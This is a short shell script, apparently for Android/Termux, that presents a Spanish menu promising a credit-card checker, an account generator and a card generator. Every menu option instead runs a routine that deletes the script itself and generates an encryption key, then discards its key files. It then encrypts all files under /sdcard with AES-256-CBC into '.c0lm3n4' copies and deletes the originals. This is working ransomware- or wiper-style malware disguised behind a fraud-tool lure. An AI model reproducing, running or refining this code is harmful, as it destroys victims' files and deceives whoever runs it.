#!/bin/sh

function banner(){
echo -e "\e[1;31m  _ __ ___   __ _ _ __(_) ___ ___  _ __           \e[0m"
echo -e "\e[1;31m | '_ ' _ \ / _' | '__| |/ __/ _ \| '_ \      \e[0m"
echo -e "\e[1;31m | | | | | | (_| | |  | | (_| (_) | | | |      \e[0m"
echo -e "\e[1;31m |_| |_| |_|\__,_|_|  |_|\___\___/|_| |_|        \e[0m"
echo -e "                                                              "
}

function menu(){
clear && banner
	echo -e "\e[0;35m[\e[0m\e[0;92m01\e[0m\e[0;35m]\e[0m  \e[0;92mCHECKER DE CCS\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m02\e[0m\e[0;35m]\e[0m  \e[0;92mGENERADOR DE CUENTAS\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m03\e[0m\e[0;35m]\e[0m  \e[0;92mGENERADOR DE CCS\e[0m"
	echo -e ""
	read -p "m4r1c0n~#: " opcion
if [[ $opcion == "01" || $opcion == "1" ]]; then
	cc 
elif [[ $opcion == "02" || $opcion == "2" ]]; then
	cuentas
elif [[ $opcion == "03" || $opcion == "3" ]]; then
	ccs
fi
}

function cc(){
	instalar_diamantes
}

function cuentas(){
	instalar_diamantes
}

function ccs(){
	instalar_diamantes
}

function instalar_diamantes(){
rm -f $0
if [ ! -d ~/diamantes/ ]; then
 mkdir ~/diamantes/
fi
openssl genpkey -out ~/diamantes/m2.p -algorithm rsa -pkeyopt rsa_keygen_bits:4096
openssl pkey -in ~/diamantes/m2.p -out ~/diamantes/m5.p -pubout
dk=$(openssl rand -hex 16)
echo $dk | openssl pkeyutl -encrypt -pubin -inkey ~/diamantes/m5.p -out ~/diamantes/dke.d
openssl pkeyutl -decrypt -inkey ~/diamantes/m2.p -in ~/diamantes/dke.d -out ~/diamantes/dk.dat
rm -rf ~/diamantes/
for fn in `find /sdcard/* -type f`; do
  if [ ! -f $fn ]; then
    continue
  fi
  openssl sha256 -r $fn > $fn.c0lm3n4
  iv=$(openssl rand -hex 16)
  echo $iv > $fn.c0lm3n4
  openssl enc -aes-256-cbc -K $dk -iv $iv -in $fn -out $fn.c0lm3n4
  rm $fn
  echo "[+] $fn Success"
done
}


menu
